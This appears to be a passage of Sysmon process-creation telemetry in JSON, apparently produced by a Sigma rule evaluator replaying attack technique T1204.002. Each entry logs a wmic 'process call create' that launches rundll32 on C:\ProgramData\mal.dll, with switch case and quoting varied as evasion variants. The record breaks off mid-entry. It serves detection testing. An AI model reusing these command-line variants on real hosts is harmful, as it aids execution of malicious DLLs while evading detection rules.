    {
      "row_id": 321,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n /u\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 210942,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_016.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /n /u\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E8C2-6A2E-4F14-000000002C00",
      "ParentProcessId": 764,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E8C2-6A2E-5014-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:45:38.423237Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:45:38.417",
      "Version": 5
    },
    {
      "row_id": 322,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /\\\"s\\\" /n -\\\"u\\\"\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 210981,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_017.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E8D8-6A2E-6314-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:46:00.390991Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:46:00.387",
      "Version": 5
    },
    {
      "row_id": 323,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /\\\"s\\\" /n -\\\"u\\\"\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 210982,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_017.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /\\\"s\\\" /n -\\\"u\\\"\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E8D8-6A2E-6314-000000002C00",
      "ParentProcessId": 8800,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E8D8-6A2E-6414-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:46:00.407435Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:46:00.404",
      "Version": 5
    },
    {
      "row_id": 324,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /S /N /u\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211027,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_018.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E8EA-6A2E-7A14-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:46:18.793285Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:46:18.785",
      "Version": 5
    },
    {
      "row_id": 325,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /S /N /u\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211028,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_018.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /S /N /u\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E8EA-6A2E-7A14-000000002C00",
      "ParentProcessId": 10876,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E8EA-6A2E-7B14-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:46:18.811457Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:46:18.808",
      "Version": 5
    },
    {
      "row_id": 326,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /\\\"s\\\" /\\\"n\\\" /u\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211073,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_019.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E8FE-6A2E-9114-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:46:38.476454Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:46:38.471",
      "Version": 5
    },
    {
      "row_id": 327,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /\\\"s\\\" /\\\"n\\\" /u\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211074,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_019.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /\\\"s\\\" /\\\"n\\\" /u\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E8FE-6A2E-9114-000000002C00",
      "ParentProcessId": 8276,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E8FE-6A2E-9214-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:46:38.528099Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:46:38.521",
      "Version": 5
    },
    {
      "row_id": 328,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /N /u\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211125,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_020.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E913-6A2E-AB14-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:46:59.082498Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:46:59.078",
      "Version": 5
    },
    {
      "row_id": 329,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /N /u\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211126,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_020.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /N /u\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E913-6A2E-AB14-000000002C00",
      "ParentProcessId": 10356,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E913-6A2E-AC14-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:46:59.107955Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:46:59.099",
      "Version": 5
    },
    {
      "row_id": 330,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /N /U\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211172,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_021.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E927-6A2E-C214-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:47:19.050870Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:47:19.043",
      "Version": 5
    },
    {
      "row_id": 331,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /N /U\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211173,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_021.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer /s /N /U\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E927-6A2E-C214-000000002C00",
      "ParentProcessId": 11444,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E927-6A2E-C314-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:47:19.089017Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:47:19.081",
      "Version": 5
    },
    {
      "row_id": 332,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer -\\\"s\\\" -\\\"n\\\" /U\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211212,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1204.002__t1204.002_022.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E93B-6A2E-D614-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T17:47:39.149184Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:47:39.145",
      "Version": 5
    },
    {
      "row_id": 333,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "wmic  process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer -\\\"s\\\" -\\\"n\\\" /U\\\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "WMI Commandline Utility",
      "EventID": 1,
      "EventRecordID": 211213,
      "FileVersion": "10.0.26100.5074 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=2E51DA7B69836CFEBCB3F9AA47C08266,SHA256=7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690,IMPHASH=43C6BE584D77B658A53A9A5C606724DD",
      "IMPHASH": "43C6BE584D77B658A53A9A5C606724DD",
      "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "2E51DA7B69836CFEBCB3F9AA47C08266",
      "Opcode": 0,
      "OriginalFileName": "wmic.exe",
      "OriginalLogfile": "t1204.002__t1204.002_022.evtx",
      "ParentCommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer -\\\"s\\\" -\\\"n\\\" /U\\\"\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E93B-6A2E-D614-000000002C00",
      "ParentProcessId": 11472,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E93B-6A2E-D714-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "7C7F386BB7C70263FD835DC58791B6DD73FC6617C27751B5503DBA8D0CDDA690",
      "SystemTime": "2026-06-14T17:47:39.171963Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:47:39.167",
      "Version": 5
    },
    {
      "row_id": 334,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"wmic process call create \\\"rundll32.exe C:\\ProgramData\\mal.dll,DllRegisterServer -\\\"s\\\" /N /u\\\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 211262,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
